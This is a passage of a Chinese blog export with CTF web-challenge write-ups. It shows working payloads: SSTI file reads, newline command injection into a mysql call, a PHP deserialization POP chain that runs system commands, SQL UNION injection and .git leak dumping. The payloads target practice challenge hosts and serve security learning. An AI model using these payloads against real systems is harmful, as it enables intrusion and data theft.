&quot;confirm&quot;:&quot;True&quot;,</span><br><span class="line">                        &quot;lucky_number&quot;:&quot;5346&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="Back-to-the-future"><a href="#Back-to-the-future" class="headerlink" title="Back to the future"></a>Back to the future</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">信息泄露 /robots.txt提示有/.git</span><br><span class="line">https://github.com/WangYihang/GitHacker</span><br><span class="line">pip install -i https://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com -r requirements.txt</span><br><span class="line">python setup.py install </span><br><span class="line">githacker --url http://challenge.imxbt.cn:30601/ --output back-future</span><br><span class="line">cd  back-future\63e93c577c72cf52e89eb9d33d5adead</span><br><span class="line">git log </span><br><span class="line">git checkout 9d85f10e0192ef630e10d7f876a117db41c30417</span><br></pre></td></tr></table></figure><h4 id="RCE-or-Sql-Inject"><a href="#RCE-or-Sql-Inject" class="headerlink" title="RCE or Sql Inject"></a>RCE or Sql Inject</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$sql = $_GET[&#x27;sql&#x27;];</span><br><span class="line">if (preg_match(&#x27;/se|ec|;|@|del|into|outfile/i&#x27;, $sql)) &#123;</span><br><span class="line">    die(&quot;你知道的，不可能有sql注入&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if (preg_match(&#x27;/&quot;|\$|`|\\\\/i&#x27;, $sql)) &#123;</span><br><span class="line">    die(&quot;你知道的，不可能有RCE&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$query = &quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot; . $sql . &quot;\&quot;&quot;;</span><br><span class="line">system($query); ctfer! You can&#x27;t succeed this time! hahaha ctfer! You can&#x27;t succeed this time! hahaha</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sql注入进行了过滤，sql注入就不可能了</span><br><span class="line">mysql命令行程序的rce,查看环境变量</span><br><span class="line">%0asystem export</span><br></pre></td></tr></table></figure><h4 id="Sql-Inject-or-RCE"><a href="#Sql-Inject-or-RCE" class="headerlink" title="Sql Inject or RCE"></a>Sql Inject or RCE</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$sql = $_GET[&#x27;sql&#x27;];</span><br><span class="line">if (preg_match(&#x27;/se|ec|st|;|@|delete|into|outfile/i&#x27;, $sql)) &#123;</span><br><span class="line">    die(&quot;你知道的，不可能有sql注入&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if (preg_match(&#x27;/&quot;|\$|`|\\\\/i&#x27;, $sql)) &#123;</span><br><span class="line">    die(&quot;你知道的，不可能有RCE&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$query = &quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot; . $sql . &quot;\&quot;&quot;;</span><br><span class="line">system($query); ctfer! You can&#x27;t succeed this time! hahaha ctfer! You can&#x27;t succeed this time! hahaha</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">更新了限制system</span><br><span class="line">delimiter+handler+read next来绕过</span><br><span class="line">%0adelimiter+aa%0ahandler+flag+openaa%0ahandler+flag+read+next</span><br></pre></td></tr></table></figure><h4 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__file__);</span><br><span class="line">function substrstr($data)</span><br><span class="line">&#123;</span><br><span class="line">    $start = mb_strpos($data, &quot;[&quot;);</span><br><span class="line">    $end = mb_strpos($data, &quot;]&quot;);</span><br><span class="line">    return mb_substr($data, $start + 1, $end - 1 - $start);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Hacker&#123;</span><br><span class="line">    public $start;</span><br><span class="line">    public $end;</span><br><span class="line">    public $username=&quot;hacker&quot;;</span><br><span class="line">    public function __construct($start)&#123;</span><br><span class="line">        $this-&gt;start=$start;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username=&quot;hacker&quot;;</span><br><span class="line">        $this-&gt;end = $this-&gt;start;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if(!preg_match(&#x27;/ctfer/i&#x27;,$this-&gt;username))&#123;</span><br><span class="line">            echo &#x27;Hacker！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C&#123;</span><br><span class="line">    public $c;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;c-&gt;c();</span><br><span class="line">        return &quot;C&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class T&#123;</span><br><span class="line">    public $t;</span><br><span class="line">    public function __call($name,$args)&#123;</span><br><span class="line">        echo $this-&gt;t-&gt;t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class F&#123;</span><br><span class="line">    public $f;</span><br><span class="line">    public function __get($name)&#123;</span><br><span class="line">        return isset($this-&gt;f-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class E&#123;</span><br><span class="line">    public $e;</span><br><span class="line">    public function __isset($name)&#123;</span><br><span class="line">        ($this-&gt;e)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class R&#123;</span><br><span class="line">    public $r;</span><br><span class="line"></span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        eval($this-&gt;r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;ez_ser.from_you&#x27;]))&#123;</span><br><span class="line">    $ctf = new Hacker(&#x27;&#123;&#123;&#123;&#x27;.$_GET[&#x27;ez_ser.from_you&#x27;].&#x27;&#125;&#125;&#125;&#x27;);</span><br><span class="line">    if(preg_match(&quot;/\[|\]/i&quot;, $_GET[&#x27;substr&#x27;]))&#123;</span><br><span class="line">        die(&quot;NONONO!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $pre = isset($_GET[&#x27;substr&#x27;])?$_GET[&#x27;substr&#x27;]:&quot;substr&quot;;</span><br><span class="line">    $ser_ctf = substrstr($pre.&quot;[&quot;.serialize($ctf).&quot;]&quot;);</span><br><span class="line">    $a = unserialize($ser_ctf);</span><br><span class="line">    throw new Exception(&quot;杂鱼~杂鱼~&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">引⽤绕过__wakeup</span><br><span class="line">gc回收的机制绕过Exception,使 __destruct 提前触发</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Hacker&#123;</span><br><span class="line">    public $start;</span><br><span class="line">    public $end;</span><br><span class="line">    public $username=&quot;hacker&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C&#123;</span><br><span class="line">    public $c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class T&#123;</span><br><span class="line">    public $t;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class F&#123;</span><br><span class="line">    public $f;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class E&#123;</span><br><span class="line">    public $e;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class R&#123;</span><br><span class="line">    public $r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new Hacker();</span><br><span class="line">$a-&gt;end=&amp;$a-&gt;username;</span><br><span class="line">$a-&gt;start=new C();</span><br><span class="line">$a-&gt;start-&gt;c = new T();</span><br><span class="line">$a-&gt;start-&gt;c-&gt;t = new F();</span><br><span class="line">$a-&gt;start-&gt;c-&gt;t-&gt;f = new E();</span><br><span class="line">$a-&gt;start-&gt;c-&gt;t-&gt;f-&gt;e = new R();</span><br><span class="line">$a-&gt;start-&gt;c-&gt;t-&gt;f-&gt;e-&gt;r = &#x27;system(&quot;whoami&quot;);&#x27;;</span><br><span class="line">$b=array(&#x27;1&#x27;=&gt;$a,&#x27;2&#x27;=&gt;null);</span><br><span class="line">echo serialize($b);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:1;O:6:&quot;Hacker&quot;:3:&#123;s:5:&quot;start&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;T&quot;:1:&#123;s:1:&quot;t&quot;;O:1:&quot;F&quot;:1:&#123;s:1:&quot;f&quot;;O:1:&quot;E&quot;:1:&#123;s:1:&quot;e&quot;;O:1:&quot;R&quot;:1:&#123;s:1:&quot;r&quot;;s:17:&quot;system(&quot;whoami&quot;);&quot;;&#125;&#125;&#125;&#125;&#125;s:3:&quot;end&quot;;s:6:&quot;hacker&quot;;s:8:&quot;username&quot;;R:9;&#125;i:1;N;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符串逃逸mb_strpos和mb_substr对于字符性质差异绕过substrstr</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?</span><br><span class="line">substr=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc</span><br><span class="line">%f0%9fab&amp;ez[ser.from_you=a:2:&#123;i:1;O:6:&quot;Hacker&quot;:3:&#123;s:5:&quot;start&quot;;O:1:&quot;C&quot;:1:</span><br><span class="line">&#123;s:1:&quot;c&quot;;O:1:&quot;T&quot;:1:&#123;s:1:&quot;t&quot;;O:1:&quot;F&quot;:1:&#123;s:1:&quot;f&quot;;O:1:&quot;E&quot;:1:&#123;s:1:&quot;e&quot;;O:1:&quot;R&quot;:1:</span><br><span class="line">&#123;s:1:&quot;r&quot;;s:17:&quot;system(&quot;whoami&quot;);&quot;;&#125;&#125;&#125;&#125;&#125;s:3:&quot;end&quot;;s:6:&quot;hacker&quot;;s:8:&quot;username&quot;;R:</span><br><span class="line">9;&#125;i:1;N;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?substr=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9fab&amp;ez[ser.from_you=a:2:&#123;i:1;O:6:&quot;Hacker&quot;:3:&#123;s:5:&quot;start&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;T&quot;:1:&#123;s:1:&quot;t&quot;;O:1:&quot;F&quot;:1:&#123;s:1:&quot;f&quot;;O:1:&quot;E&quot;:1:&#123;s:1:&quot;e&quot;;O:1:&quot;R&quot;:1:&#123;s:1:&quot;r&quot;;s:17:&quot;system(&quot;cat /*&quot;);&quot;;&#125;&#125;&#125;&#125;&#125;s:3:&quot;end&quot;;s:6:&quot;hacker&quot;;s:8:&quot;username&quot;;R:9;&#125;i:1;N;&#125;</span><br></pre></td></tr></table></figure><h4 id="Just-Readme-前置"><a href="#Just-Readme-前置" class="headerlink" title="Just Readme (前置)"></a>Just Readme (前置)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo file_get_contents($_POST[&#x27;file&#x27;]);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CVE-2024-2961</span><br><span class="line">https://xz.aliyun.com/news/14986</span><br></pre></td></tr></table></figure><h4 id="Readme"><a href="#Readme" class="headerlink" title="Readme"></a>Readme</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">测信道获取文件内容，然后打CVE-2024-2961。</span><br></pre></td></tr></table></figure><h4 id="scxml"><a href="#scxml" class="headerlink" title="scxml"></a>scxml</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.pyn3rd.com/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 做梦都想进vn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重生我要当web糕手之?ctf</title>
      <link href="/posts/15956.html"/>
      <url>/posts/15956.html</url>
      
        <content type="html"><![CDATA[<h1 id="ctf–web"><a href="#ctf–web" class="headerlink" title="?ctf–web"></a>?ctf–web</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">复现一下最近的新手赛，复现完就去反序列化和java了，sun师傅拷打的压迫感</span><br><span class="line">?ctf的体量和考点都很适宜好玩，开赛的时候只打了week1的，果然还是等不及，后面就没打完赛打完好了【依旧是没有打week4的那俩体反序列化，下次一定嘻嘻】</span><br><span class="line">有的点没思路了就看了官p，c3哥哥大爱模板，喜欢【微信公众号直接搜A1natas就好了】</span><br><span class="line">不对的魔丸发言的地方，随时联系交流狠狠拷打我 感谢师傅</span><br></pre></td></tr></table></figure><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="from-http"><a href="#from-http" class="headerlink" title="from_http"></a><strong>from_http</strong></h3><h4 id="考点：http协议"><a href="#考点：http协议" class="headerlink" title="考点：http协议"></a>考点：http协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从http入门吧~</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251103142439101.png" alt="image-20251103142439101"></p><h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping??"></a><strong>Ping??</strong></h3><h4 id="考点：linux命令"><a href="#考点：linux命令" class="headerlink" title="考点：linux命令"></a>考点：linux命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给你一个ping工具，然后狠狠的想办法ping我吧</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251103142651244.png" alt="image-20251103142651244"></p><p>对flag进行了过滤，查看index.php发现是对完整的flag进行过滤，那么进行通配符匹配就好了</p><p><img src="/../images/image-20251103142907720.png" alt="image-20251103142907720"><img src="/../images/image-20251103143046336.png" alt="image-20251103143046336"></p><h3 id="Gitttttttt"><a href="#Gitttttttt" class="headerlink" title="Gitttttttt"></a><strong>Gitttttttt</strong></h3><h4 id="考点：-git信息泄露"><a href="#考点：-git信息泄露" class="headerlink" title="考点：.git信息泄露"></a>考点：.git信息泄露</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">今天布置网站的时候发现本地怎么有个.git文件夹，那是什么？无所谓了，我的静态网页不可能存在漏洞！</span><br></pre></td></tr></table></figure><p>直接使用gackby获取.git文件即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://challenge.ilovectf.cn:30589/.git/</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251103143455238.png" alt="image-20251103143455238"></p><p><img src="/../images/image-20251103143522322.png" alt="image-20251103143522322"></p><h3 id="包含不明东西的食物？！"><a href="#包含不明东西的食物？！" class="headerlink" title="包含不明东西的食物？！"></a><strong>包含不明东西的食物？！</strong></h3><h4 id="考点：php中的文件包含以及路径穿越"><a href="#考点：php中的文件包含以及路径穿越" class="headerlink" title="考点：php中的文件包含以及路径穿越"></a>考点：php中的文件包含以及路径穿越</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将物品投入锅里即可收获神秘礼品😋</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251103144203470.png" alt="image-20251103144203470"></p><p>试了试是四层目录结构</p><p><img src="/../images/image-20251103144239645.png" alt="image-20251103144239645"></p><h3 id="secret-of-php"><a href="#secret-of-php" class="headerlink" title="secret of php"></a><strong>secret of php</strong></h3><h4 id="考点：php的弱比较"><a href="#考点：php的弱比较" class="headerlink" title="考点：php的弱比较"></a>考点：php的弱比较</h4><p><img src="/../images/image-20251103150121318.png" alt="image-20251103150121318"></p><p>intval函数后强等于，使用小数点绕过?a&#x3D;2025.1</p><p><img src="/../images/image-20251103150218496.png" alt="image-20251103150218496"></p><p>来到fll4g.php是经典的md5了</p><p><img src="/../images/image-20251103150316954.png" alt="image-20251103150316954"></p><p>第一层是特殊的字符串绕过</p><p>第二层是数组绕过</p><p>第三层是md5碰撞</p><p><img src="/../images/image-20251103150939241.png" alt="image-20251103150939241"></p><h3 id="前端小游戏"><a href="#前端小游戏" class="headerlink" title="前端小游戏"></a><strong>前端小游戏</strong></h3><h4 id="考点：js代码审计"><a href="#考点：js代码审计" class="headerlink" title="考点：js代码审计"></a>考点：js代码审计</h4><p><img src="/../images/image-20251103151239293.png" alt="image-20251103151239293"></p><p>base64解码即可</p><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="登录和查询"><a href="#登录和查询" class="headerlink" title="登录和查询"></a><strong>登录和查询</strong></h3><h4 id="考点：字典爆破-sql注入"><a href="#考点：字典爆破-sql注入" class="headerlink" title="考点：字典爆破+sql注入"></a>考点：字典爆破+sql注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这么简单的登录和查询界面，应该是漏洞百出的吧～</span><br><span class="line"></span><br><span class="line">提示：本题只需要少于100次的爆破，快速大量爆破可能导致意外被平台拦截流量（不是题目问题）。</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251103151647865.png" alt="image-20251103151647865"></p><p>给了账号名已经密码字典</p><p><img src="/../images/image-20251103151749681.png" alt="image-20251103151749681"></p><p>常规爆破密码，发现有一个是302重定向了</p><p><img src="/../images/image-20251103152137919.png" alt="image-20251103152137919"></p><p>登录密码进来之后是一个SQL注入，flag在flags表里</p><p><img src="/../images/image-20251103152329633.png" alt="image-20251103152329633"></p><p>sql联合注入，向id传入的参数值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; UNION SELECT flag, NULL, NULL FROM flags WHERE id=2--%20</span><br></pre></td></tr></table></figure><h3 id="Only-Picture-Up"><a href="#Only-Picture-Up" class="headerlink" title="Only Picture Up"></a><strong>Only Picture Up</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">咦？上传一个图片就能得到flag？</span><br></pre></td></tr></table></figure><h4 id="考点：文件上传"><a href="#考点：文件上传" class="headerlink" title="考点：文件上传"></a>考点：文件上传</h4><p>简单的文件上传然后直接连接木马就好了</p><p>flag在根目录下</p><p><img src="/../images/image-20251103162640937.png" alt="image-20251103162640937"></p><h3 id="Regular-Expression"><a href="#Regular-Expression" class="headerlink" title="Regular Expression"></a>Regular Expression</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正则表达式是一个好工具！</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251103163025491.png" alt="image-20251103163025491"></p><h4 id="考点：正则表达式"><a href="#考点：正则表达式" class="headerlink" title="考点：正则表达式"></a>考点：正则表达式</h4><p>第一关的正则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#x27;/^-(ctf|CTF)&lt;\n&gt;&#123;5&#125;[h-l]\d\d\W+@email\.com flag.\b$/&#x27;, $_？) &amp;&amp; strlen($_？) == 40)</span><br></pre></td></tr></table></figure><p>传参变量名是?,然而?在url中⼜是资源路径和参数的分隔符,可以使用编码或者写python脚本来说明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1、^-</span><br><span class="line">这是必须以 - 号为字符串开头，所以我们字符串的开头必须是减号。</span><br><span class="line">2、(ctf|CTF)</span><br><span class="line">这俩是⼀个匹配组，就是减号后⾯紧跟着得是 ctf 或者 CTF ，⼆者选其⼀。</span><br><span class="line">3、&lt;\n&gt;&#123;5&#125;</span><br><span class="line">主要是&gt;&#123;5&#125;，这个的意思是要有五个&gt;，&lt;不变，\n是换⾏，url编码⼀下就是%0a，所以这⾥是 &lt;%0a&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">4、[h-l]</span><br><span class="line">这是通配符，在h到l之前的字⺟选其⼀填⼊，这⾥可以是h、i、j、k、l。五选⼀填⼊</span><br><span class="line">5、\d\d</span><br><span class="line">\d在正则表达式中是任意数字，两个就是任意⼀个两位数，⽐如 55</span><br><span class="line">6、\W+</span><br><span class="line">这⾥是与除 A-Z、a-z、0-9 和下划线以外的任意字符匹配，⽐如!、@、~、#、空格、等等。加号的意思是贪婪匹配，⼀</span><br><span class="line">次或多次匹配前⾯的字符或⼦表达式。这⾥就是我们满⾜后⾯字符串⻓度为40所需要控制的地⽅，因为这⾥可以是任意⻓</span><br><span class="line">度。</span><br><span class="line">7、@email.com flag.</span><br><span class="line">字⾯意思。第⼀个点号被反斜杠转义了，所以就是点号，第⼆个点号在正则表达式当中的作⽤就是匹配任意单个字符⽐如</span><br><span class="line">a，所以这⾥是 @email.com`` flaga</span><br><span class="line">8、.\b$</span><br><span class="line">这⾥是以任意字符结尾，随便什么字⺟数字都可以。</span><br><span class="line"></span><br><span class="line">&quot;-ctf&lt;&quot; + &quot;\n&quot; + &quot;&gt;&gt;&gt;&gt;&gt;&quot; + &quot;h12&quot; + &quot;!@#$%^&amp;*()&quot; + &quot;@email.com flaga&quot;</span><br></pre></td></tr></table></figure><p>第二关正则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$test_string = &#x27;Please\ 777give+. !me?&lt;=-=&gt;(.*)Flaggg0&#x27;;</span><br><span class="line"></span><br><span class="line">(preg_match(&#x27;/&#x27;.$preg.&#x27;/&#x27;, $test_string) &amp;&amp; strlen($_POST[&#x27;preg&#x27;]) &gt; 77)</span><br></pre></td></tr></table></figure><p>反斜杠和问号属于正则表达式保留字符，要匹配他们本身需要被转义。加号在浏览器传参的时候不能直接写，直接写会被当成空格传到后端，加号需要url编码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> r&quot;\QPlease\ 777give+. !me?&lt;=-=&gt;(.*)Flaggg0\E(?#&quot; + &quot;A&quot;*80 + &quot;)&quot;</span><br><span class="line"> </span><br><span class="line"> preg=Please\\ 777give\%2b. !me\?!(-!)</span><br><span class="line">(.*)Flagg[abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGH]</span><br><span class="line">[abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGH]</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/2403_88857807/article/details/154292256">?CTF 2025 misc web部分解-CSDN博客</a>的脚本，也就是正常发送请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url = &quot;http://challenge.ilovectf.cn:30399/&quot;</span><br><span class="line"> </span><br><span class="line">get_val = &quot;-ctf&lt;&quot; + &quot;\n&quot; + &quot;&gt;&gt;&gt;&gt;&gt;&quot; + &quot;h12&quot; + &quot;!@#$%^&amp;*()&quot; + &quot;@email.com flaga&quot;</span><br><span class="line">preg = r&quot;\QPlease\ 777give+. !me?&lt;=-=&gt;(.*)Flaggg0\E(?#&quot; + 